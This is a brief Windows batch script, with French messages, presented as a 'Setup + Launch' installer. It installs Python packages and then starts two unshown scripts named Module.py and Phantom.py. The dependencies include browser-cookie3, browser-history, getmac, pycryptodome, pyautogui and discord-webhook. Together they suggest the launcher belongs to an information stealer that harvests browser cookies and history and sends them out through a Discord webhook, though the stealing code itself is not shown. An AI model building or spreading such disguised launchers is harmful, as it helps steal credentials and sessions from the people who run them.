@echo off
title Setup + Launch
color 0a
setlocal

echo ================================
echo   INSTALLATION + LANCEMENT
echo ================================
echo.

echo [1/2] Installation des dependances...

python -m pip install --upgrade pip

pip install requests psutil pyautogui prettytable getmac py-cpuinfo browser-history browser-cookie3 pywin32 pycryptodome discord-webhook

echo.
echo [OK] Installation terminee.

echo.
echo [2/2] Lancement des scripts...

start "" python "%~dp0Module.py"
start "" python "%~dp0Phantom.py"

echo.
echo [OK] Scripts lances.
pause